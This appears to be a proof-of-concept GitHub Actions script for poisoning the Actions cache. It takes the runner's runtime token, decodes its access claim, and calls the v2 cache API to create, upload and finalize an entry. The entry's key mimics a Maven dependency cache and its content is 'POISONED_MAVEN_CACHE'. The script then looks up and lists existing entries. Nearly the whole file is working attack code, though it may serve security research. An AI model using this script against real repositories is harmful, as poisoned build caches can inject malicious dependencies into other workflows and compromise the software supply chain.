const http = require('http');
const https = require('https');
const crypto = require('crypto');

function makeRequest(url, options, body) {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(url);
    const reqOptions = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      ...options,
      headers: { ...options.headers, 'User-Agent': 'cache-test-action' }
    };
    const req = (parsedUrl.protocol === 'https:' ? https : http).request(reqOptions, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

async function run() {
  const cacheUrl = process.env['ACTIONS_CACHE_URL'];
  const runtimeToken = process.env['ACTIONS_RUNTIME_TOKEN'];
  const resultsUrl = process.env['ACTIONS_RESULTS_URL'];

  // Decode JWT
  if (runtimeToken) {
    const parts = runtimeToken.split('.');
    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
    console.log('=== Runtime Token JWT ac claim ===');
    console.log(`ac: ${JSON.stringify(payload.ac)}`);
    console.log(`Event: ${process.env['GITHUB_EVENT_NAME']}`);
  }

  // Try v2 cache API via ACTIONS_RESULTS_URL
  if (resultsUrl && runtimeToken) {
    console.log('\n=== Testing v2 Cache API (Twirp) ===');
    console.log(`Results URL: ${resultsUrl}`);

    const version = crypto.createHash('sha256').update('~/.m2/repository').digest('hex');
    const testKey = 'Linux-maven-Maven Central Release-v2test-' + Date.now();
    
    // CreateCacheEntry via Twirp
    const createBody = JSON.stringify({
      key: testKey,
      version: version
    });

    console.log(`\nCreating cache entry with key: ${testKey}`);
    const createResp = await makeRequest(
      `${resultsUrl}twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry`,
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${runtimeToken}`,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(createBody)
        }
      },
      createBody
    );
    console.log(`Create Status: ${createResp.status}`);
    console.log(`Create Body: ${createResp.body.substring(0, 500)}`);

    if (createResp.status === 200) {
      const parsed = JSON.parse(createResp.body);
      console.log(`\nSigned Upload URL: ${parsed.signed_upload_url ? '[PRESENT]' : 'MISSING'}`);
      
      if (parsed.signed_upload_url) {
        // Upload content
        const content = Buffer.from('POISONED_MAVEN_CACHE');
        const uploadResp = await makeRequest(parsed.signed_upload_url, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/octet-stream',
            'Content-Length': content.length,
            'x-ms-blob-type': 'BlockBlob'
          }
        }, content);
        console.log(`Upload Status: ${uploadResp.status}`);

        // Finalize
        const finalBody = JSON.stringify({
          key: testKey,
          version: version,
          size_bytes: content.length
        });
        const finalResp = await makeRequest(
          `${resultsUrl}twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload`,
          {
            method: 'POST',
            headers: {
              'Authorization': `Bearer ${runtimeToken}`,
              'Content-Type': 'application/json',
              'Content-Length': Buffer.byteLength(finalBody)
            }
          },
          finalBody
        );
        console.log(`Finalize Status: ${finalResp.status}`);
        console.log(`Finalize Body: ${finalResp.body.substring(0, 200)}`);

        if (finalResp.status === 200) {
          console.log('\nSUCCESS: Cache entry created with arbitrary key via v2 API!');
        }
      }
    } else if (createResp.status === 403) {
      console.log('\nBLOCKED: Cache write denied (likely read-only token)');
    }

    // Also try LookupCacheEntry
    const lookupBody = JSON.stringify({
      key: testKey,
      version: version,
      restore_keys: []
    });
    const lookupResp = await makeRequest(
      `${resultsUrl}twirp/github.actions.results.api.v1.CacheService/LookupCacheEntry`,
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${runtimeToken}`,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(lookupBody)
        }
      },
      lookupBody
    );
    console.log(`\nLookup Status: ${lookupResp.status}`);
    console.log(`Lookup Body: ${lookupResp.body.substring(0, 300)}`);

    // List caches
    const listBody = JSON.stringify({ key: 'Linux-maven' });
    const listResp = await makeRequest(
      `${resultsUrl}twirp/github.actions.results.api.v1.CacheService/ListCacheEntries`,
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${runtimeToken}`,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(listBody)
        }
      },
      listBody
    );
    console.log(`\nList Status: ${listResp.status}`);
    console.log(`List Body: ${listResp.body.substring(0, 500)}`);
  }
}

run().catch(err => { console.error('Error:', err); process.exit(1); });
